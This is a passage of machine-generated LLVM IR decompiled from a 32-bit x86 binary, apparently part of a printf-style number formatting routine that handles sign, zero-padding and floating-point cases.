  %v2_80508db = add i32 %v1_80508db, 16
  %v3_80508db = inttoptr i32 %v2_80508db to i32*
  store i32 %v1_80508ce, i32* %v3_80508db, align 4
  %v0_80508df = load i32, i32* @esp, align 4
  %v1_80508df = add i32 %v0_80508df, 340
  %v2_80508df = inttoptr i32 %v1_80508df to i32*
  store i32 0, i32* %v2_80508df, align 4
  %v0_80508ea = load i32, i32* @esp, align 4
  %v1_80508ed = add i32 %v0_80508ea, 16
  store i32 %v1_80508ed, i32* @ebx, align 4
  %v2_80508f1 = add i32 %v0_80508ea, -16
  %v3_80508f1 = inttoptr i32 %v2_80508f1 to i32*
  store i32 %v1_80508ed, i32* %v3_80508f1, align 4
  %v0_80508f2 = load i32, i32* %stack_var_-364, align 4
  %v1_80508f2 = inttoptr i32 %v0_80508f2 to i32*
  %v2_80508f2 = call i32 @function_8050fa5(i32* %v1_80508f2)
  store i32 %v2_80508f2, i32* %eax.global-to-local, align 4
  %v0_80508f7 = load i32, i32* @ebx, align 4
  %v1_80508f7 = load i32, i32* @esp, align 4
  %v2_80508f7 = inttoptr i32 %v1_80508f7 to i32*
  store i32 %v0_80508f7, i32* %v2_80508f7, align 4
  %v0_80508fa = load i32, i32* %stack_var_-364, align 4
  %v1_80508fa = call i32 @function_8050e6c(i32 %v0_80508fa)
  store i32 %v1_80508fa, i32* %eax.global-to-local, align 4
  %v0_80508ff = load i32, i32* @esp, align 4
  %v1_80508ff = add i32 %v0_80508ff, 70
  %v2_80508ff = inttoptr i32 %v1_80508ff to i8*
  %v3_80508ff = load i8, i8* %v2_80508ff, align 1
  %v4_80508ff = zext i8 %v3_80508ff to i32
  store i32 %v4_80508ff, i32* @edi, align 4
  %v1_8050904 = add i32 %v0_80508ff, 16
  %v1_8050907 = add i32 %v0_80508ff, 56
  %v2_8050907 = inttoptr i32 %v1_8050907 to i32*
  %v3_8050907 = load i32, i32* %v2_8050907, align 4
  %v1_805090c = add i32 %v0_80508ff, 112
  store i32 %v1_805090c, i32* %edx.global-to-local, align 4
  %tmp65 = icmp slt i32 %v3_8050907, 1
  br i1 %tmp65, label %dec_label_pc_8050919, label %dec_label_pc_8050912

dec_label_pc_8050912:                             ; preds = %dec_label_pc_80508db
  %v3_8050912 = mul nuw nsw i32 %v4_80508ff, 12
  store i32 %v3_8050912, i32* %eax.global-to-local, align 4
  %v2_8050915 = add i32 %v0_80508ff, 100
  %v3_8050915 = add i32 %v2_8050915, %v3_8050912
  store i32 %v3_8050915, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050919

dec_label_pc_8050919:                             ; preds = %dec_label_pc_80508db, %dec_label_pc_8050912
  %v0_805092126 = phi i32 [ %v1_805090c, %dec_label_pc_80508db ], [ %v3_8050915, %dec_label_pc_8050912 ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_805091b = add i32 %v0_80508ff, 60
  %v2_805091b = inttoptr i32 %v1_805091b to i32*
  %v3_805091b = load i32, i32* %v2_805091b, align 4
  store i32 %v3_805091b, i32* %ecx.global-to-local, align 4
  %v2_805092c76 = sub i32 0, %v3_805091b
  %v10_805092c79 = and i32 %v3_805091b, %v2_805092c76
  %v11_805092c80 = icmp slt i32 %v10_805092c79, 0
  %v13_805092c81 = icmp slt i32 %v2_805092c76, 0
  %v2_805092e82 = icmp eq i1 %v13_805092c81, %v11_805092c80
  br i1 %v2_805092e82, label %dec_label_pc_8050930, label %dec_label_pc_8050921

dec_label_pc_8050921:                             ; preds = %dec_label_pc_8050919, %dec_label_pc_8050921
  %v0_805093086 = phi i32 [ %v0_8050930, %dec_label_pc_8050921 ], [ %v1_8050904, %dec_label_pc_8050919 ]
  %v2_805092185 = phi i32 [ %v1_805092b, %dec_label_pc_8050921 ], [ 0, %dec_label_pc_8050919 ]
  %v0_805092184 = phi i32 [ %v1_8050928, %dec_label_pc_8050921 ], [ %v0_805092126, %dec_label_pc_8050919 ]
  %v3_8050921 = mul i32 %v2_805092185, 4
  %v4_8050921 = add i32 %v0_805093086, 344
  %v5_8050921 = add i32 %v4_8050921, %v3_8050921
  %v6_8050921 = inttoptr i32 %v5_8050921 to i32*
  store i32 %v0_805092184, i32* %v6_8050921, align 4
  %v0_8050928 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050928 = add i32 %v0_8050928, 12
  store i32 %v1_8050928, i32* %edx.global-to-local, align 4
  %v0_805092b = load i32, i32* %eax.global-to-local, align 4
  %v1_805092b = add i32 %v0_805092b, 1
  store i32 %v1_805092b, i32* %eax.global-to-local, align 4
  %v1_805092c.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_805092c = sub i32 %v1_805092b, %v1_805092c.pre
  %v8_805092c = xor i32 %v1_805092b, %v1_805092c.pre
  %v9_805092c = xor i32 %v2_805092c, %v1_805092b
  %v10_805092c = and i32 %v9_805092c, %v8_805092c
  %v11_805092c = icmp slt i32 %v10_805092c, 0
  %v13_805092c = icmp slt i32 %v2_805092c, 0
  %v2_805092e = icmp eq i1 %v13_805092c, %v11_805092c
  %v0_8050930 = load i32, i32* @esp, align 4
  br i1 %v2_805092e, label %dec_label_pc_8050930, label %dec_label_pc_8050921

dec_label_pc_8050930:                             ; preds = %dec_label_pc_8050921, %dec_label_pc_8050919
  %v0_8050930.lcssa = phi i32 [ %v1_8050904, %dec_label_pc_8050919 ], [ %v0_8050930, %dec_label_pc_8050921 ]
  %v1_8050930 = add i32 %v0_8050930.lcssa, 48
  %v2_8050930 = inttoptr i32 %v1_8050930 to i32*
  %v3_8050930 = load i32, i32* %v2_8050930, align 4
  store i32 %v3_8050930, i32* @ecx, align 4
  %v1_8050934 = icmp eq i32 %v3_8050930, 0
  %v1_8050936 = icmp eq i1 %v1_8050934, false
  br i1 %v1_8050936, label %dec_label_pc_805095e, label %dec_label_pc_8050938

dec_label_pc_8050938:                             ; preds = %dec_label_pc_8050930
  %v1_8050938 = inttoptr i32 %v0_8050930.lcssa to i32*
  %v2_8050938 = load i32, i32* %v1_8050938, align 4
  store i32 %v2_8050938, i32* %eax.global-to-local, align 4
  %v1_805093b = ashr i32 %v2_8050938, 31
  store i32 %v1_805093b, i32* %edx.global-to-local, align 4
  %v2_805093c = add i32 %v0_8050930.lcssa, -4
  %v3_805093c = inttoptr i32 %v2_805093c to i32*
  store i32 %v1_805093b, i32* %v3_805093c, align 4
  %v0_805093d = load i32, i32* %eax.global-to-local, align 4
  %v2_805093d = add i32 %v0_8050930.lcssa, -8
  %v3_805093d = inttoptr i32 %v2_805093d to i32*
  store i32 %v0_805093d, i32* %v3_805093d, align 4
  %v1_805093e = add i32 %v0_8050930.lcssa, 32
  %v2_805093e = inttoptr i32 %v1_805093e to i32*
  %v3_805093e = load i32, i32* %v2_805093e, align 4
  %v1_8050942 = and i32 %v3_805093e, 3840
  store i32 %v1_8050942, i32* %eax.global-to-local, align 4
  %v2_8050947 = add i32 %v0_8050930.lcssa, -12
  %v3_8050947 = inttoptr i32 %v2_8050947 to i32*
  store i32 %v1_8050942, i32* %v3_8050947, align 4
  %v1_8050948 = add i32 %v0_8050930.lcssa, 344
  %v2_8050948 = inttoptr i32 %v1_8050948 to i32*
  %v3_8050948 = load i32, i32* %v2_8050948, align 4
  store i32 %v3_8050948, i32* %eax.global-to-local, align 4
  %v1_805094f = inttoptr i32 %v3_8050948 to i32*
  %v2_805094f = load i32, i32* %v1_805094f, align 4
  %v4_805094f = add i32 %v0_8050930.lcssa, -16
  %v5_805094f = inttoptr i32 %v4_805094f to i32*
  store i32 %v2_805094f, i32* %v5_805094f, align 4
  %v0_8050951 = call i32 @function_8053ef4()
  store i32 %v0_8050951, i32* %eax.global-to-local, align 4
  %v0_8050956 = load i32, i32* @esp, align 4
  %v1_8050956 = add i32 %v0_8050956, 16
  br label %dec_label_pc_8050d90

dec_label_pc_805095e:                             ; preds = %dec_label_pc_8050930
  %tmp89 = icmp ult i32 %v3_8050930, 8
  br i1 %tmp89, label %dec_label_pc_8050967, label %dec_label_pc_8050ac8

dec_label_pc_8050967:                             ; preds = %dec_label_pc_805095e
  %v1_8050967 = add i32 %v3_8050930, 134591984
  %v2_8050967 = inttoptr i32 %v1_8050967 to i8*
  %v3_8050967 = load i8, i8* %v2_8050967, align 1
  %v4_8050967 = sext i8 %v3_8050967 to i32
  store i32 %v4_8050967, i32* @esi, align 4
  store i32 87, i32* @ebx, align 4
  %v9_8050973 = icmp eq i8 %v3_8050967, 10
  %v1_8050976 = icmp eq i1 %v9_8050973, false
  br i1 %v1_8050976, label %dec_label_pc_8050994, label %dec_label_pc_8050978

dec_label_pc_8050978:                             ; preds = %dec_label_pc_8050967
  %v1_8050978 = add i32 %v0_8050930.lcssa, 32
  %v2_8050978 = inttoptr i32 %v1_8050978 to i32*
  %v3_8050978 = load i32, i32* %v2_8050978, align 4
  %v1_805097e = and i32 %v3_8050978, 32
  store i32 %v1_805097e, i32* %eax.global-to-local, align 4
  %tmp66 = udiv i32 %v1_805097e, 32
  %tmp67 = sub nsw i32 45, %tmp66
  store i32 %tmp67, i32* @ebx, align 4
  %v1_805098c = trunc i32 %v3_8050978 to i8
  %v2_805098c = and i8 %v1_805098c, 64
  %v3_805098c = icmp eq i8 %v2_805098c, 0
  %v5_805098c = zext i8 %v2_805098c to i32
  %v7_805098c = and i32 %v3_8050978, -256
  %v8_805098c = or i32 %v5_805098c, %v7_805098c
  store i32 %v8_805098c, i32* %edx.global-to-local, align 4
  br i1 %v3_805098c, label %dec_label_pc_8050994, label %dec_label_pc_8050991

dec_label_pc_8050991:                             ; preds = %dec_label_pc_8050978
  %v2_8050991 = or i32 %tmp67, 128
  store i32 %v2_8050991, i32* @ebx, align 4
  br label %dec_label_pc_8050994

dec_label_pc_8050994:                             ; preds = %dec_label_pc_8050978, %dec_label_pc_8050967, %dec_label_pc_8050991
  %tmp90 = icmp ult i32 %v3_8050930, 6
  br i1 %tmp90, label %dec_label_pc_8050999, label %dec_label_pc_80509b1

dec_label_pc_8050999:                             ; preds = %dec_label_pc_8050994
  %v9_8050999 = icmp eq i32 %v3_8050930, 3
  %v1_805099c = icmp eq i1 %v9_8050999, false
  br i1 %v1_805099c, label %dec_label_pc_80509a5, label %dec_label_pc_805099e

dec_label_pc_805099e:                             ; preds = %dec_label_pc_8050999
  store i32 55, i32* @ebx, align 4
  br label %dec_label_pc_80509b3

dec_label_pc_80509a5:                             ; preds = %dec_label_pc_8050999
  %v9_80509aa = icmp eq i32 %v3_8050930, 1
  br i1 %v9_80509aa, label %dec_label_pc_80509b8, label %dec_label_pc_80509b3

dec_label_pc_80509b1:                             ; preds = %dec_label_pc_8050994
  %v1_80509b1 = sub nsw i32 0, %v4_8050967
  store i32 %v1_80509b1, i32* @esi, align 4
  br label %dec_label_pc_80509b3

dec_label_pc_80509b3:                             ; preds = %dec_label_pc_80509a5, %dec_label_pc_805099e, %dec_label_pc_80509b1
  br label %dec_label_pc_80509b8

dec_label_pc_80509b8:                             ; preds = %dec_label_pc_80509a5, %dec_label_pc_80509b3
  %storemerge101 = phi i32 [ 11, %dec_label_pc_80509b3 ], [ 6, %dec_label_pc_80509a5 ]
  store i32 %storemerge101, i32* @ebp, align 4
  %v1_80509b8 = add i32 %v0_8050930.lcssa, 7
  %v2_80509b8 = inttoptr i32 %v1_80509b8 to i8*
  store i8 32, i8* %v2_80509b8, align 1
  %v0_80509bd = load i32, i32* @esp, align 4
  %v1_80509bd = add i32 %v0_80509bd, 20
  %v2_80509bd = inttoptr i32 %v1_80509bd to i32*
  %v3_80509bd = load i32, i32* %v2_80509bd, align 4
  %v5_80509bd = icmp slt i32 %v3_80509bd, 0
  %v1_80509c2 = icmp eq i1 %v5_80509bd, false
  br i1 %v1_80509c2, label %dec_label_pc_80509cc, label %dec_label_pc_80509c4

dec_label_pc_80509c4:                             ; preds = %dec_label_pc_80509b8
  %v1_80509c4 = add i32 %v0_80509bd, 36
  %v2_80509c4 = inttoptr i32 %v1_80509c4 to i8*
  %v3_80509c4 = load i8, i8* %v2_80509c4, align 1
  %v4_80509c4 = zext i8 %v3_80509c4 to i32
  %v5_80509c4 = load i32, i32* %edx.global-to-local, align 4
  %v6_80509c4 = and i32 %v5_80509c4, -256
  %v7_80509c4 = or i32 %v6_80509c4, %v4_80509c4
  store i32 %v7_80509c4, i32* %edx.global-to-local, align 4
  %v3_80509c8 = add i32 %v0_80509bd, 7
  %v4_80509c8 = inttoptr i32 %v3_80509c8 to i8*
  store i8 %v3_80509c4, i8* %v4_80509c8, align 1
  %v0_80509cc.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80509cc

dec_label_pc_80509cc:                             ; preds = %dec_label_pc_80509b8, %dec_label_pc_80509c4
  %v1_80509e5 = phi i32 [ %v0_80509bd, %dec_label_pc_80509b8 ], [ %v0_80509cc.pre, %dec_label_pc_80509c4 ]
  %v1_80509cc = add i32 %v1_80509e5, 344
  %v2_80509cc = inttoptr i32 %v1_80509cc to i32*
  %v3_80509cc = load i32, i32* %v2_80509cc, align 4
  store i32 %v3_80509cc, i32* %eax.global-to-local, align 4
  store i32 1024, i32* %edx.global-to-local, align 4
  %v1_80509d8 = add i32 %v3_8050930, -1
  %v8_80509d8 = icmp eq i32 %v1_80509d8, 0
  store i32 %v1_80509d8, i32* %ecx.global-to-local, align 4
  %v0_80509e5.pre = load i32, i32* @edi, align 4
  br i1 %v8_80509d8, label %dec_label_pc_80509e5, label %dec_label_pc_80509db

dec_label_pc_80509db:                             ; preds = %dec_label_pc_80509cc
  %v2_80509db = mul i32 %v0_80509e5.pre, 4
  %v3_80509db = add i32 %v1_80509e5, 52
  %v4_80509db = add i32 %v3_80509db, %v2_80509db
  %v5_80509db = inttoptr i32 %v4_80509db to i32*
  %v6_80509db = load i32, i32* %v5_80509db, align 4
  %v1_80509df = and i32 %v6_80509db, 3840
  store i32 %v1_80509df, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80509e5

dec_label_pc_80509e5:                             ; preds = %dec_label_pc_80509cc, %dec_label_pc_80509db
  %v2_80509e5 = add i32 %v1_80509e5, -4
  %v3_80509e5 = inttoptr i32 %v2_80509e5 to i32*
  store i32 %v0_80509e5.pre, i32* %v3_80509e5, align 4
  %v0_80509e6 = load i32, i32* @esi, align 4
  %v2_80509e6 = add i32 %v1_80509e5, -8
  %v3_80509e6 = inttoptr i32 %v2_80509e6 to i32*
  store i32 %v0_80509e6, i32* %v3_80509e6, align 4
  %v0_80509e7 = load i32, i32* %eax.global-to-local, align 4
  %v2_80509e7 = add i32 %v1_80509e5, -12
  %v3_80509e7 = inttoptr i32 %v2_80509e7 to i32*
  store i32 %v0_80509e7, i32* %v3_80509e7, align 4
  %v0_80509e8 = load i32, i32* %edx.global-to-local, align 4
  %v2_80509e8 = add i32 %v1_80509e5, -16
  %v3_80509e8 = inttoptr i32 %v2_80509e8 to i32*
  store i32 %v0_80509e8, i32* %v3_80509e8, align 4
  %v0_80509e9 = call i32 @function_8053e9c()
  %v0_80509ee = load i32, i32* @ebx, align 4
  %v1_80509ee = load i32, i32* @esp, align 4
  %v2_80509ee = inttoptr i32 %v1_80509ee to i32*
  store i32 %v0_80509ee, i32* %v2_80509ee, align 4
  %v0_80509f1 = load i32, i32* @esi, align 4
  %v1_80509f1 = load i32, i32* @esp, align 4
  %v2_80509f1 = add i32 %v1_80509f1, -4
  %v3_80509f1 = inttoptr i32 %v2_80509f1 to i32*
  store i32 %v0_80509f1, i32* %v3_80509f1, align 4
  %v0_80509f2 = load i32, i32* @edx, align 4
  %v2_80509f2 = add i32 %v1_80509f1, -8
  %v3_80509f2 = inttoptr i32 %v2_80509f2 to i32*
  store i32 %v0_80509f2, i32* %v3_80509f2, align 4
  %v2_80509f3 = add i32 %v1_80509f1, -12
  %v3_80509f3 = inttoptr i32 %v2_80509f3 to i32*
  store i32 %v0_80509e9, i32* %v3_80509f3, align 4
  %v1_80509f4 = add i32 %v1_80509f1, 347
  store i32 %v1_80509f4, i32* %eax.global-to-local, align 4
  %v2_80509fb = add i32 %v1_80509f1, -16
  %v3_80509fb = inttoptr i32 %v2_80509fb to i32*
  store i32 %v1_80509f4, i32* %v3_80509fb, align 4
  %v0_80509fc = load i32, i32* %stack_var_-364, align 4
  %v5_80509fc = inttoptr i32 %v0_80509fc to i8*
  %v6_80509fc = call i32 @function_8053f34(i8* %v5_80509fc, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_80509fc, i32* %eax.global-to-local, align 4
  %v0_8050a01 = load i32, i32* @esp, align 4
  %v1_8050a01 = add i32 %v0_8050a01, 32
  store i32 %v6_80509fc, i32* @edi, align 4
  %v1_8050a06 = add i32 %v0_8050a01, 80
  %v2_8050a06 = inttoptr i32 %v1_8050a06 to i32*
  %v3_8050a06 = load i32, i32* %v2_8050a06, align 4
  %tmp91 = icmp ult i32 %v3_8050a06, 6
  br i1 %tmp91, label %dec_label_pc_8050a34, label %dec_label_pc_8050a0d

dec_label_pc_8050a0d:                             ; preds = %dec_label_pc_80509e5
  %v1_8050a0d = inttoptr i32 %v6_80509fc to i8*
  %v2_8050a0d = load i8, i8* %v1_8050a0d, align 1
  %v11_8050a0d = icmp eq i8 %v2_8050a0d, 45
  %v1_8050a10 = icmp eq i1 %v11_8050a0d, false
  %v1_8050a1f = add i32 %v0_8050a01, 64
  %v2_8050a1f = inttoptr i32 %v1_8050a1f to i32*
  %v3_8050a1f = load i32, i32* %v2_8050a1f, align 4
  br i1 %v1_8050a10, label %dec_label_pc_8050a1f, label %dec_label_pc_8050a12

dec_label_pc_8050a12:                             ; preds = %dec_label_pc_8050a0d
  %v4_8050a12 = or i32 %v3_8050a1f, 2
  store i32 %v4_8050a12, i32* %v2_8050a1f, align 4
  %v0_8050a17 = load i32, i32* @edi, align 4
  %v1_8050a17 = add i32 %v0_8050a17, 1
  store i32 %v1_8050a17, i32* @edi, align 4
  store i32 2, i32* @ebp, align 4
  %v0_8050a34.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050a34

dec_label_pc_8050a1f:                             ; preds = %dec_label_pc_8050a0d
  store i32 %v3_8050a1f, i32* %eax.global-to-local, align 4
  %v2_8050a23 = and i32 %v3_8050a1f, 2
  %v3_8050a23 = icmp eq i32 %v2_8050a23, 0
  br i1 %v3_8050a23, label %dec_label_pc_8050a2b, label %dec_label_pc_8050a27

dec_label_pc_8050a27:                             ; preds = %dec_label_pc_8050a1f
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_8050a34

dec_label_pc_8050a2b:                             ; preds = %dec_label_pc_8050a1f
  %v2_8050a2b = urem i32 %v3_8050a1f, 2
  %v3_8050a2b = icmp eq i32 %v2_8050a2b, 0
  br i1 %v3_8050a2b, label %dec_label_pc_8050a34, label %dec_label_pc_8050a2f

dec_label_pc_8050a2f:                             ; preds = %dec_label_pc_8050a2b
  store i32 4, i32* @ebp, align 4
  br label %dec_label_pc_8050a34

dec_label_pc_8050a34:                             ; preds = %dec_label_pc_8050a2b, %dec_label_pc_80509e5, %dec_label_pc_8050a27, %dec_label_pc_8050a12, %dec_label_pc_8050a2f
  %v0_8050a87 = phi i32 [ %v6_80509fc, %dec_label_pc_8050a2b ], [ %v6_80509fc, %dec_label_pc_80509e5 ], [ %v6_80509fc, %dec_label_pc_8050a27 ], [ %v1_8050a17, %dec_label_pc_8050a12 ], [ %v6_80509fc, %dec_label_pc_8050a2f ]
  %v0_8050a96 = phi i32 [ %v1_8050a01, %dec_label_pc_8050a2b ], [ %v1_8050a01, %dec_label_pc_80509e5 ], [ %v1_8050a01, %dec_label_pc_8050a27 ], [ %v0_8050a34.pre, %dec_label_pc_8050a12 ], [ %v1_8050a01, %dec_label_pc_8050a2f ]
  %v1_8050a34 = add i32 %v0_8050a96, 204
  store i32 %v1_8050a34, i32* %ecx.global-to-local, align 4
  %v1_8050a3b = add i32 %v0_8050a96, 20
  %v2_8050a3b = inttoptr i32 %v1_8050a3b to i32*
  %v3_8050a3b = load i32, i32* %v2_8050a3b, align 4
  store i32 %v3_8050a3b, i32* %edx.global-to-local, align 4
  %v2_8050a3f = sub i32 %v1_8050a34, %v0_8050a87
  store i32 %v2_8050a3f, i32* %ecx.global-to-local, align 4
  %v2_8050a41 = icmp slt i32 %v3_8050a3b, 0
  %v1_8050a43 = add i32 %v2_8050a3f, 127
  store i32 %v1_8050a43, i32* @esi, align 4
  %v1_8050a46 = icmp eq i1 %v2_8050a41, false
  br i1 %v1_8050a46, label %dec_label_pc_8050a4d, label %dec_label_pc_8050a48

dec_label_pc_8050a48:                             ; preds = %dec_label_pc_8050a34
  store i32 1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050a4d

dec_label_pc_8050a4d:                             ; preds = %dec_label_pc_8050a34, %dec_label_pc_8050a48
  %v0_8050a73 = phi i32 [ %v3_8050a3b, %dec_label_pc_8050a34 ], [ 1, %dec_label_pc_8050a48 ]
  %v1_8050a4d = add i32 %v0_8050a96, 32
  %v2_8050a4d = inttoptr i32 %v1_8050a4d to i8*
  %v3_8050a4d = load i8, i8* %v2_8050a4d, align 1
  %v4_8050a4d = and i8 %v3_8050a4d, 16
  %v5_8050a4d = icmp eq i8 %v4_8050a4d, 0
  br i1 %v5_8050a4d, label %dec_label_pc_8050a87, label %dec_label_pc_8050a54

dec_label_pc_8050a54:                             ; preds = %dec_label_pc_8050a4d
  %v1_8050a54 = add i32 %v0_8050a96, 48
  %v2_8050a54 = inttoptr i32 %v1_8050a54 to i32*
  %v3_8050a54 = load i32, i32* %v2_8050a54, align 4
  store i32 %v3_8050a54, i32* %eax.global-to-local, align 4
  %tmp92 = icmp ult i32 %v3_8050a54, 3
  br i1 %tmp92, label %dec_label_pc_8050a6e.thread, label %dec_label_pc_8050a62

dec_label_pc_8050a6e.thread:                      ; preds = %dec_label_pc_8050a54
  store i32 6, i32* @ebp, align 4
  br label %dec_label_pc_8050a87

dec_label_pc_8050a62:                             ; preds = %dec_label_pc_8050a54
  %v9_8050a62 = icmp eq i32 %v3_8050a54, 3
  %v1_8050a65 = icmp eq i1 %v9_8050a62, false
  br i1 %v1_8050a65, label %dec_label_pc_8050a6e, label %dec_label_pc_8050a67

dec_label_pc_8050a67:                             ; preds = %dec_label_pc_8050a62
  store i32 9, i32* @ebp, align 4
  br label %dec_label_pc_8050a87

dec_label_pc_8050a6e:                             ; preds = %dec_label_pc_8050a62
  %v9_8050a6e = icmp eq i32 %v3_8050a54, 4
  %v1_8050a71 = icmp eq i1 %v9_8050a6e, false
  br i1 %v1_8050a71, label %dec_label_pc_8050a87, label %dec_label_pc_8050a73

dec_label_pc_8050a73:                             ; preds = %dec_label_pc_8050a6e
  %tmp93 = icmp ugt i32 %v0_8050a73, %v1_8050a43
  br i1 %tmp93, label %dec_label_pc_8050a87, label %dec_label_pc_8050a77

dec_label_pc_8050a77:                             ; preds = %dec_label_pc_8050a73
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_8050a7c = inttoptr i32 %v0_8050a87 to i8*
  %v2_8050a7c = load i8, i8* %v1_8050a7c, align 1
  %v8_8050a7c = icmp eq i8 %v2_8050a7c, 48
  br i1 %v8_8050a7c, label %dec_label_pc_8050a87, label %dec_label_pc_8050a81

dec_label_pc_8050a81:                             ; preds = %dec_label_pc_8050a77
  %v1_8050a81 = add i32 %v2_8050a3f, 128
  store i32 %v1_8050a81, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050a87

dec_label_pc_8050a87:                             ; preds = %dec_label_pc_8050a6e.thread, %dec_label_pc_8050a73, %dec_label_pc_8050a77, %dec_label_pc_8050a6e, %dec_label_pc_8050a4d, %dec_label_pc_8050a67, %dec_label_pc_8050a81
  %v0_8050abf = phi i32 [ %v0_8050a73, %dec_label_pc_8050a73 ], [ 1, %dec_label_pc_8050a77 ], [ %v0_8050a73, %dec_label_pc_8050a6e ], [ %v0_8050a73, %dec_label_pc_8050a4d ], [ %v0_8050a73, %dec_label_pc_8050a67 ], [ %v1_8050a81, %dec_label_pc_8050a81 ], [ %v0_8050a73, %dec_label_pc_8050a6e.thread ]
  %v1_8050a87 = inttoptr i32 %v0_8050a87 to i8*
  %v2_8050a87 = load i8, i8* %v1_8050a87, align 1
  %v8_8050a87 = icmp eq i8 %v2_8050a87, 48
  %v1_8050a8a = icmp eq i1 %v8_8050a87, false
  br i1 %v1_8050a8a, label %dec_label_pc_8050ab7, label %dec_label_pc_8050a8c

dec_label_pc_8050a8c:                             ; preds = %dec_label_pc_8050a87
  %v0_8050a8c = load i32, i32* @ebp, align 4
  %v7_8050a8f = icmp sgt i32 %v0_8050a8c, 5
  br i1 %v7_8050a8f, label %dec_label_pc_8050a91, label %dec_label_pc_8050a96

dec_label_pc_8050a91:                             ; preds = %dec_label_pc_8050a8c
  store i32 11, i32* @ebp, align 4
  br label %dec_label_pc_8050a96

dec_label_pc_8050a96:                             ; preds = %dec_label_pc_8050a8c, %dec_label_pc_8050a91
  %v1_8050a96 = add i32 %v0_8050a96, 48
  %v2_8050a96 = inttoptr i32 %v1_8050a96 to i32*
  %v3_8050a96 = load i32, i32* %v2_8050a96, align 4
  %v12_8050a96 = icmp eq i32 %v3_8050a96, 1
  %v1_8050a9b = icmp eq i1 %v12_8050a96, false
  br i1 %v1_8050a9b, label %dec_label_pc_8050aac, label %dec_label_pc_8050a9d

dec_label_pc_8050a9d:                             ; preds = %dec_label_pc_8050a96
  store i32 ptrtoint ([6 x i8]* @global_var_805b5d8.310 to i32), i32* @edi, align 4
  store i32 5, i32* @esi, align 4
  br label %dec_label_pc_8050c28

dec_label_pc_8050aac:                             ; preds = %dec_label_pc_8050a96
  %v1_8050aac = icmp eq i32 %v0_8050abf, 0
  %v1_8050aae = icmp eq i1 %v1_8050aac, false
  br i1 %v1_8050aae, label %dec_label_pc_8050ab7, label %dec_label_pc_8050ab0

dec_label_pc_8050ab0:                             ; preds = %dec_label_pc_8050aac
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8050c28

dec_label_pc_8050ab7:                             ; preds = %dec_label_pc_8050aac, %dec_label_pc_8050a87
  %v2_8050ab7 = sub i32 %v0_8050abf, %v1_8050a43
  %v7_8050ab7 = icmp ult i32 %v0_8050abf, %v1_8050a43
  %v12_8050ab7 = icmp eq i32 %v2_8050ab7, 0
  %v2_8050ab9 = or i1 %v7_8050ab7, %v12_8050ab7
  br i1 %v2_8050ab9, label %dec_label_pc_8050c28, label %dec_label_pc_8050abf

dec_label_pc_8050abf:                             ; preds = %dec_label_pc_8050ab7
  store i32 %v2_8050ab7, i32* @ebx, align 4
  br label %dec_label_pc_8050c42

dec_label_pc_8050ac8:                             ; preds = %dec_label_pc_805095e
  %tmp94 = icmp ult i32 %v3_8050930, 16
  br i1 %tmp94, label %dec_label_pc_8050acd, label %dec_label_pc_8050b12

dec_label_pc_8050acd:                             ; preds = %dec_label_pc_8050ac8
  %v1_8050acd = add i32 %v0_8050930.lcssa, 33
  %v2_8050acd = inttoptr i32 %v1_8050acd to i8*
  %v3_8050acd = load i8, i8* %v2_8050acd, align 1
  %v4_8050acd = and i8 %v3_8050acd, 8
  %v5_8050acd = icmp eq i8 %v4_8050acd, 0
  %v1_8050ad2 = add i32 %v0_8050930.lcssa, 344
  %v2_8050ad2 = inttoptr i32 %v1_8050ad2 to i32*
  %v3_8050ad2 = load i32, i32* %v2_8050ad2, align 4
  store i32 %v3_8050ad2, i32* %edx.global-to-local, align 4
  br i1 %v5_8050acd, label %dec_label_pc_8050adf, label %dec_label_pc_8050adb

dec_label_pc_8050adb:                             ; preds = %dec_label_pc_8050acd
  %v1_8050adb = inttoptr i32 %v3_8050ad2 to x86_fp80*
  %v2_8050adb = load x86_fp80, x86_fp80* %v1_8050adb, align 4
  br label %dec_label_pc_8050ae1

dec_label_pc_8050adf:                             ; preds = %dec_label_pc_8050acd
  %v1_8050adf = inttoptr i32 %v3_8050ad2 to double*
  %v2_8050adf = load double, double* %v1_8050adf, align 4
  %v3_8050adf = fpext double %v2_8050adf to x86_fp80
  br label %dec_label_pc_8050ae1

dec_label_pc_8050ae1:                             ; preds = %dec_label_pc_8050adb, %dec_label_pc_8050adf
  %storemerge3 = phi x86_fp80 [ %v2_8050adb, %dec_label_pc_8050adb ], [ %v3_8050adf, %dec_label_pc_8050adf ]
  store x86_fp80 %storemerge3, x86_fp80* %st0.global-to-local, align 4
  %v0_8050ae1 = load i32, i32* @esi, align 4
  %v2_8050ae1 = add i32 %v0_8050930.lcssa, -4
  %v3_8050ae1 = inttoptr i32 %v2_8050ae1 to i32*
  store i32 %v0_8050ae1, i32* %v3_8050ae1, align 4
  %v0_8050ae2 = load i32, i32* @esi, align 4
  %v2_8050ae2 = add i32 %v0_8050930.lcssa, -8
  %v3_8050ae2 = inttoptr i32 %v2_8050ae2 to i32*
  store i32 %v0_8050ae2, i32* %v3_8050ae2, align 4
  %v1_8050ae3 = add i32 %v0_8050930.lcssa, -12
  %v2_8050ae3 = inttoptr i32 %v1_8050ae3 to i32*
  store i32 134547366, i32* %v2_8050ae3, align 4
  %v1_8050ae8 = add i32 %v0_8050930.lcssa, 20
  store i32 %v1_8050ae8, i32* %eax.global-to-local, align 4
  %v2_8050aec = add i32 %v0_8050930.lcssa, -16
  %v3_8050aec = inttoptr i32 %v2_8050aec to i32*
  store i32 %v1_8050ae8, i32* %v3_8050aec, align 4
  %v1_8050aed = add i32 %v0_8050930.lcssa, -28
  %v1_8050af0 = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_8050af0 = inttoptr i32 %v1_8050aed to x86_fp80*
  store x86_fp80 %v1_8050af0, x86_fp80* %v3_8050af0, align 4
